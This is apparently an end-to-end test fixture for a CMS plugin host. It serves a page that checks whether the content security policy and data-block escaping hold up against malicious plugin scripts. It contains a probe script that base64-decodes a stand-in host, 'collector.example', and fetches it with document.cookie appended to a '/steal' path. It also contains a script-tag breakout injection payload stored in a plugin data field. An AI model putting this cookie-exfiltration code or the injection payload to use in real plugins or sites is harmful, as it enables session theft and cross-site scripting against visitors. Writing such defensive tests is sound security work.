// SPDX-License-Identifier: MPL-2.0

/**
 * #1729 — a page with plugin client assets, served with the headers a host
 * sends, for apps/admin/e2e/plugin-client-assets.browser.ts. No database:
 * the page is put together by the functions a build runs.
 *
 * - Two probe plugins pass the review every plugin meets
 *   (`validateManifest`). `probe-open` may reach `https://approved.example`
 *   (its grant); its script also fetches an address it computes at runtime,
 *   which the review cannot see. `probe-gated` declares a consent purpose,
 *   so its script waits for the visitor's consent.
 * - The consent-manager runtime is the shipped file with its build data.
 * - The assets are injected by the plugin host (`injectPluginAssets`), the
 *   CSP is derived by the build's scanner (`CspScanner`) and composed in
 *   `enforce` mode, and every document carries it.
 *
 * Prints `READY <port> /` once it serves.
 */

import consentManager from "@caelo-cms/plugin-consent-manager";
import {
  dataBlockJson,
  injectPluginAssets,
  PLUGIN_DATA_FILE,
  type PluginClientAsset,
  withAssetContent,
} from "@caelo-cms/plugin-host";
import { validateManifest } from "@caelo-cms/plugin-sandbox";
import { definePlugin, manifestFromDefinition } from "@caelo-cms/plugin-sdk";
import { composeSiteHeaders, DEFAULT_SITE_SECURITY_POLICY } from "@caelo-cms/shared";
import { CspScanner } from "@caelo-cms/static-generator";

/** The open probe: reports what its two requests did, and what its data block held. */
const OPEN_JS = `(function () {
  var report = document.documentElement;
  var violations = [];
  document.addEventListener("securitypolicyviolation", function (e) {
    violations.push(e.violatedDirective + " " + e.blockedURI);
    report.setAttribute("data-violations", violations.join("|"));
  });
  var el = document.querySelector('script[type="application/json"][data-caelo-plugin-data="probe-open"]');
  var data = JSON.parse(el.textContent);
  report.setAttribute("data-note", data.note);
  function settle(name) {
    return function (res) { report.setAttribute("data-" + name, res && res.ok ? "ok" : "failed"); };
  }
  function failed(name) {
    return function () { report.setAttribute("data-" + name, "blocked"); };
  }
  fetch("https://approved.example/ok").then(settle("approved"), failed("approved"));
  // Computed at runtime, so no review can read it: the CSP has to stop it.
  fetch(atob(data.target) + "/steal?d=" + encodeURIComponent(document.cookie)).then(
    settle("collector"),
    failed("collector"),
  );
})();`;

/** The gated probe: marks that it ran. */
const GATED_JS = `document.documentElement.setAttribute("data-gated", "ran");`;

const probeOpen = definePlugin({
  slug: "probe-open",
  version: "1.0.0",
  tier: 1,
  schema: {},
  requestedCapabilities: ["client_assets"],
  capabilityConstraints: {
    client_assets: { origins: { connect: ["https://approved.example"] } },
  },
  clientFiles: { "probe.js": OPEN_JS },
  buildDataOperation: "data",
  operations: { data: async () => ({}) },
});

const probeGated = definePlugin({
  slug: "probe-gated",
  version: "1.0.0",
  tier: 1,
  schema: {},
  requestedCapabilities: ["client_assets"],
  requiresPlugins: ["consent-manager"],
  consentPurposes: [
    {
      key: "probe_measure",
      category: "analytics",
      purpose: "Measures how the probe page is used.",
      cookies: [],
    },
  ],
  clientFiles: { "gated.js": GATED_JS },
  operations: {},
});

for (const def of [probeOpen, probeGated, consentManager]) {
  const r = validateManifest(manifestFromDefinition(def), { workerCron: "record" });
  if (r.failures.length > 0) {
    throw new Error(`${def.slug}: the review refused it: ${JSON.stringify(r.failures)}`);
  }
}

/** One reviewed file as the host emits it (client-assets.ts collectBuildAssets). */
function file(
  slug: string,
  fileName: string,
  content: string,
  consent?: string[],
): PluginClientAsset {
  return withAssetContent(
    {
      pluginSlug: slug,
      fileName,
      kind: fileName.endsWith(".css") ? "css" : "js",
      content,
      relPath: "",
      publicPath: "",
      ...(consent ? { consent } : {}),
    },
    content,
  );
}

function data(slug: string, value: unknown): PluginClientAsset {
  return {
    pluginSlug: slug,
    fileName: PLUGIN_DATA_FILE,
    kind: "data",
    content: dataBlockJson(value),
    relPath: "",
    publicPath: "",
  };
}

const consentFiles = consentManager.clientFiles ?? {};
const assets: PluginClientAsset[] = [
  file("consent-manager", "runtime.css", consentFiles["runtime.css"] as string),
  file("consent-manager", "runtime.js", consentFiles["runtime.js"] as string),
  data("consent-manager", {
    slug: "consent-manager",
    policyVersion: 1,
    recordEndpoint: "/api/plugin/consent-manager/record_consent",
    consentHeader: "x-caelo-consent",
    categories: [
      { key: "necessary", displayName: "Necessary", required: true },
      { key: "analytics", displayName: "Analytics", required: false },
    ],
    tags: [],
  }),
  file("probe-gated", "gated.js", GATED_JS, ["analytics"]),
  file("probe-open", "probe.js", OPEN_JS),
  data("probe-open", {
    note: "</script><script>document.documentElement.setAttribute('data-pwned','1')</script><!--",
    target: btoa("https://collector.example"),
  }),
];

const page = injectPluginAssets(
  `<!doctype html><html lang="en"><head><title>Client assets</title></head><body>
<main><h1>Client assets</h1></main>
<div data-consent-banner><p>Cookies?</p><button type="button" data-consent-accept-all>Accept all</button></div>
</body></html>`,
  assets,
  "linked",
);

const scanner = new CspScanner("http://127.0.0.1");
scanner.scanPage(page, "/");
scanner.addPlugin("probe-open", { origins: { connect: ["https://approved.example"] } });
const headers = composeSiteHeaders(
  { ...DEFAULT_SITE_SECURITY_POLICY, cspMode: "enforce" },
  scanner.facts(),
).headers;

const files = new Map(assets.filter((a) => a.publicPath).map((a) => [a.publicPath, a.content]));

const server = Bun.serve({
  hostname: "127.0.0.1",
  port: 0,
  fetch(req) {
    const path = new URL(req.url).pathname;
    if (path === "/") {
      return new Response(page, { headers: { ...headers, "content-type": "text/html" } });
    }
    const body = files.get(path);
    if (body !== undefined) {
      return new Response(body, { headers: { "content-type": "text/javascript" } });
    }
    if (path === "/api/plugin/consent-manager/record_consent") {
      return new Response(null, { status: 204 });
    }
    return new Response("not found", { status: 404 });
  },
});

process.on("SIGTERM", () => {
  server.stop(true);
  process.exit(0);
});
console.log(`READY ${server.port} /`);
